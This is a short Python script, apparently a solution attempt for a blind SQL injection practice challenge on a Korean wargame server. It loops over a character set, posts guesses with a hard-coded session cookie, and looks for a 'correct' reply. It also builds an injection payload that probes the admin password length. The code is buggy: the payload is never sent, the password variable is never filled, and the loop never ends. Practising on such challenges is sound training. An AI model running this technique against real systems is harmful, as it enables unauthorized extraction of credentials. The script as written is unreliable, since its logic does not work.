import requests


cset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789?!_'


url = "http://plus.or.kr:19092/sqli_blind_concept.php"
headers = {"Cookie":"PHPSESSID=tivtndo9pr3uo0dmfd6jrh1n67"}
pw=""
i = 0

while True:
    query = "?id=admin' and length(pw)={} %23".format(i)
    for c in cset:
        r = requests.post(url, data={'idx':i, 'char':c})
        if r.text.find("맞습니다") != -1:
            print("{}번째 {}".format(i, c))
            break
    i += 1
